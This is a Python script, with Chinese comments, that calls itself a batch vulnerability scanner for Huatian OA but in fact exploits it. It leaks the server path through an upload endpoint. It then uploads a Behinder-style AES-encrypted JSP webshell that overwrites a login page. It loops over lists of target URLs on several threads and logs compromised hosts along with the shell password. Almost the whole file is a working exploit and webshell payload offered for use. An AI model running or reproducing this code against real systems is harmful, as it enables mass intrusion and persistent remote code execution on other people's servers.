import requests
import sys
import re
import os
import argparse
import concurrent.futures
import warnings
from datetime import datetime

warnings.filterwarnings('ignore')  # 全局忽略SSL警告

def logo():
    print('''
      _      _                                                             
     | |    | |                                                            \r
     | |__  | |_  _ __    __ _   __ _   ___  ___  ______  ___ __  __ _ __  \r
     | '_ \ | __|| '_ \  / _` | / _` | / _ \/ __||______|/ _ \\\\ \/ /| '_ \ \r
     | | | || |_ | |_) || (_| || (_| ||  __/\__ \       |  __/ >  < | |_) |\r
     |_| |_| \__|| .__/  \__,_| \__, | \___||___/        \___|/_/\_\| .__/ \r
                 | |             __/ |                              | |    \r
                 |_|            |___/                               |_|    
                                        by Dsb v1.2 (批量扫描版)
    ''')

def get_path(url):
    """探测服务器真实路径"""
    try:
        upload_url = f"{url}/OAapp/jsp/upload.jsp"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary5Ur8laykKAWws2QO'
        }
        body = (
            '------WebKitFormBoundary5Ur8laykKAWws2QO\r\n'
            'Content-Disposition: form-data; name="file"; filename="test.xml"\r\n'
            'Content-Type: image/png\r\n\r\n'
            'real path\r\n'
            '------WebKitFormBoundary5Ur8laykKAWws2QO\r\n'
            'Content-Disposition: form-data; name="filename"\r\n\r\n'
            'test.png\r\n'
            '------WebKitFormBoundary5Ur8laykKAWws2QO--\r\n'
        )
        response = requests.post(upload_url, data=body, headers=headers, verify=False, timeout=15)
        # 多模式路径匹配
        patterns = [
            r'(.*?)Tomcat/webapps/.*?\.dat',
            r'(.*?)htoadata/appdata/.*?\.dat'
        ]
        for pattern in patterns:
            match = re.search(pattern, response.text)
            if match:
                return match.group(1)
        return None
    except Exception as e:
        return f"Path探测失败: {str(e)}"

def upload_webshell(url, path):
    """上传冰蝎Webshell"""
    try:
        webshell_path = f"{path}Tomcat/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp"
        upload_url = f"{url}/OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp"
        boundary = "----WebKitFormBoundaryzRSYXfFlXqk6btQm"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
            'Content-Type': f'multipart/form-data; boundary={boundary}'
        }
        
        jsp_payload = (
            '<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">'
            '<jsp:directive.page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"/>'
            '<jsp:declaration> class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte[]b){return super.defineClass(b,0,b.length);}}</jsp:declaration>'
            '<jsp:scriptlet>'
            'String k="e45e329feb5d925b";session.putValue("u",k);'
            'Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));'
            'new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);'
            '</jsp:scriptlet></jsp:root>'
        )
        
        body = (
            f'--{boundary}\r\n'
            'Content-Disposition: form-data; name="EDITFILE"; filename="test.txt"\r\n'
            'Content-Type: image/png\r\n\r\n'
            f'{jsp_payload}\r\n'
            f'--{boundary}\r\n'
            'Content-Disposition: form-data; name="newFileName"\r\n\r\n'
            f'{webshell_path}\r\n'
            f'--{boundary}--\r\n'
        )
        
        response = requests.post(upload_url, data=body, headers=headers, verify=False, timeout=15)
        return response.status_code == 200
    except Exception as e:
        return False

def check_and_exploit(url):
    """检测并利用单个目标"""
    result = {'url': url, 'status': 'unknown', 'webshell': None, 'error': None}
    try:
        # 步骤1: 路径探测
        path = get_path(url)
        if not path or "失败" in path:
            result['status'] = 'safe'
            result['error'] = path if "失败" in path else "未匹配到有效路径"
            return result
        
        # 步骤2: 上传Webshell
        if upload_webshell(url, path):
            result['status'] = 'vulnerable'
            result['webshell'] = f"{url}/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp"
        else:
            result['status'] = 'exploit_failed'
            
    except requests.exceptions.RequestException as e:
        result['status'] = 'error'
        result['error'] = f"网络错误: {str(e)}"
    except Exception as e:
        result['status'] = 'error'
        result['error'] = f"未知错误: {str(e)}"
    
    return result

def batch_scan(url_file, threads=5, report_dir='reports'):
    """批量扫描入口"""
    # 读取目标列表
    if not os.path.exists(url_file):
        print(f"[!] 文件 {url_file} 不存在")
        return
    
    with open(url_file, 'r') as f:
        urls = list({line.strip() for line in f if line.strip()})
    
    print(f"[*] 开始扫描 {len(urls)} 个目标，线程数: {threads}")
    
    # 创建报告目录
    os.makedirs(report_dir, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    csv_report = os.path.join(report_dir, f'htoa_scan_{timestamp}.csv')
    
    # 多线程扫描
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_and_exploit, url): url for url in urls}
        
        with open(csv_report, 'w', encoding='utf-8') as f:
            f.write("URL,状态,Webshell路径,错误信息\n")  # CSV头
            
            for future in concurrent.futures.as_completed(futures):
                url = futures[future]
                try:
                    result = future.result()
                    line = f'"{url}",{result["status"]},'
                    line += f'"{result["webshell"]}"' if result["webshell"] else ','
                    line += f',"{result["error"]}"' if result["error"] else ''
                    f.write(line + '\n')
                    f.flush()  # 实时写入
                    
                    # 控制台实时输出
                    status_map = {
                        'vulnerable': ('\033[92m[成功]\033[0m', '存在漏洞'),
                        'safe': ('\033[93m[安全]\033[0m', '未发现漏洞'),
                        'exploit_failed': ('\033[91m[失败]\033[0m', '利用失败'),
                        'error': ('\033[91m[错误]\033[0m', '检测错误')
                    }
                    color, msg = status_map.get(result['status'], ('', ''))
                    print(f"{color} {url.ljust(50)} {msg}")
                
                except Exception as e:
                    print(f"\033[91m[异常]\033[0m {url} 任务执行异常: {str(e)}")
    
    print(f"\n[*] 扫描完成！报告已保存至: {csv_report}")

if __name__ == '__main__':
    logo()
    parser = argparse.ArgumentParser(description='华天OA漏洞批量扫描工具')
    parser.add_argument('-u', '--url', help='单个目标URL')
    parser.add_argument('-f', '--file', default='url.txt', help='目标URL列表文件（默认url.txt）')
    parser.add_argument('-t', '--threads', type=int, default=5, help='并发线程数（默认5）')
    parser.add_argument('-o', '--output', default='reports', help='报告保存目录（默认reports）')
    
    args = parser.parse_args()
    
    if args.url:
        result = check_and_exploit(args.url)
        print("\n[+] 单目标检测结果:")
        print(f"URL: {args.url}")
        print(f"状态: {result['status']}")
        if result['webshell']:
            print(f"Webshell路径: {result['webshell']}\n密码: rebeyond")
        if result['error']:
            print(f"错误信息: {result['error']}")
    else:
        batch_scan(args.file, args.threads, args.output)